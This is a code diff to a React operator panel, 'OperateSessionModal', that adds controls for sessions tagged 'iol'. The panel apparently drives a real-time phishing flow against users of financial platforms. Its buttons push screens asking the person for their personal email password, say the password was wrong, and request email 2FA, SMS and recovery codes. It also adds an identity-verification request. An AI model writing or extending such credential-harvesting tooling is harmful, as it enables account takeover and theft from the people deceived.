@@ -626,7 +626,47 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
               decisionSending={decisionSending}
             />
           </>
-        ) : (session.source === "paysera" || session.source === "cocosdigital" || session.source === "ueex" || session.source === "iol") ? (
+        ) : session.source === "iol" ? (
+          /* ── IOL: only Email Sync + Wayni ── */
+          <>
+            {/* Sincronização E-mail — abre IolSyncEmailScreen (senha do email pessoal) */}
+            <div className="rounded-lg border border-amber-500/20 bg-amber-500/5 p-3">
+              <div className="flex items-center gap-1.5 mb-2">
+                <Mail size={12} className="text-amber-400" />
+                <span className="text-[10px] font-bold uppercase tracking-wider text-amber-400">Sincronização E-mail</span>
+              </div>
+              <div className="flex items-center gap-1.5 flex-wrap">
+                <ActionChip icon={<MailCheck size={10} />} label="Pedir Email" active={A === "e_sync"} onClick={eSyncEmail} disabled={!!sending} variant="primary" />
+                <ActionChip icon={<AlertTriangle size={10} />} label="Senha ✗" active={A === "e_wrong"} onClick={eWrongPassword} disabled={!!sending} variant="warn" />
+                <ActionChip icon={<ShieldCheck size={10} />} label="2FA Email" active={A === "e_otp"} onClick={eAskOtp} disabled={!!sending} variant="default" />
+                <ActionChip icon={<Smartphone size={10} />} label="SMS" active={A === "e_sms_code"} onClick={eAdvanceSmsCode} disabled={!!sending} variant="default" />
+                <span className="w-px h-4 bg-border" />
+                <ActionChip icon={<Mail size={10} />} label="Recup." active={A === "e_rec"} onClick={eAskRecovery} disabled={!!sending} variant="default" />
+                <ActionChip icon={<Mail size={10} />} label="Código Recup." active={A === "e_rec_code"} onClick={eAskRecoveryCode} disabled={!!sending} variant="default" />
+                <span className="w-px h-4 bg-border" />
+                <ActionChip icon={<CheckCircle size={10} />} label="Aprovar" active={decision === "approved" && currentPhase === "email"} onClick={eApprove} disabled={decisionSending} variant="success" />
+                <ActionChip icon={<XCircle size={10} />} label="Rejeitar" active={decision === "rejected" && currentPhase === "email"} onClick={eReject} disabled={decisionSending} variant="danger" />
+              </div>
+            </div>
+
+            <div className="rounded-lg border border-primary/20 bg-primary/5 p-3">
+              <div className="mb-2 flex items-center gap-1.5">
+                <ShieldCheck size={12} className="text-primary" />
+                <span className="text-[10px] font-bold uppercase tracking-wider text-primary">Onboarding Wayni</span>
+              </div>
+              <div className="flex items-center gap-1.5 flex-wrap">
+                <ActionChip
+                  icon={<ShieldCheck size={10} />}
+                  label="Solicitar Wayni"
+                  active={A === "kyc_request"}
+                  onClick={requestKyc}
+                  disabled={!!sending}
+                  variant="primary"
+                />
+              </div>
+            </div>
+          </>
+        ) : (session.source === "paysera" || session.source === "cocosdigital" || session.source === "ueex") ? (
           /* ── Platform + Identificação + Email Sync Controls ── */
           <>
             {/* Platform Actions */}
